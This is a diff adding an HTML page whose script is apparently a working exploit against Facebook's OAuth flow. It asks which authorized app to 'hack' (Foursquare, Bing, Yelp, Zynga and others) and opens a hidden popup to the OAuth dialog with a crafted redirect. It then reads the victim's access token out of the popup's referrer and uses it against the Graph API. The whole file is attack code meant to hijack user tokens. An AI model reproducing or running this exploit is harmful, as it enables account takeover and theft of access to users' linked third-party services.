@@ -1,0 +1,48 @@
+<html><head>
+<script>
+//http://www.facebook.com/appcenter/my
+
+var cut_me = encodeURIComponent('<script>window.Bootloader && Bootloader.done(["gZ1qR"]);</script>');
+var target_app_id = prompt('choose authorized app you wanna hack: \
+	86734274142,                 //foursquare\
+	111239619098,                // bing\
+   139475280761,                // pandora\
+   162729813767876,        // tripadvisor\
+   97534753161,                 // yelp\
+   326803741017,                // rottentomatoes\
+   175789541954,                // clicker\
+   136494494209,                // scribd\
+   119178388096593,        // docs\
+   176611639027113,        // zynga\
+   111071104403,                // kixeye\
+   221300197978270,        // ea');
+
+//86734274142; 
+// token - to get access to resources
+// signed_request - to log into 3rd party websites
+var sensitive_info = 'token%2Csigned_request';
+var url = "http://www.facebook.com/dialog/oauth?client_id=" + target_app_id + "&response_type="+sensitive_info+"&display=none&domain=facebook.com&origin=1&redirect_uri=http%3A%2F%2Ffacebook.com%2F%23%2521%2Fconnect%2Fxd_arbiter%23%21%2Ffind-friends%2Fbrowser%3Fcb%3Df3d2e47528%26origin%3Dhttp%253A%252F%252Fdevelopers.facebook.com%252Ff3ee4a8818%26domain%3Dfacebook.com%26relation%3Dparent%26state%3D"+cut_me+"&sdk=joey";
+var playground = window.open(url,'n','height=1,width=1');
+
+var hello = function(data){
+  alert('Whats up '+data.name+" your token is "+window.token);
+}
+
+var int = setInterval(function(){
+  if(playground.document && playground.document.referrer.match(/find-friends/)){
+    //it's about:blank now!
+    playground.close();
+    clearInterval(int);
+    var ref = playground.document.referrer;
+    console.log('referer', ref)
+    window.token = ref.match(/token=([^\&]+)/)
+    if(window.token){
+      window.token = window.token[1];
+      document.write('<script src="https://graph.facebook.com/me?callback=hello&access_token='+window.token+'"></script>');
+    }else{
+      alert('Please run again with another app id');
+    }
+
+  }
+}, 100);
+</script></head></html>
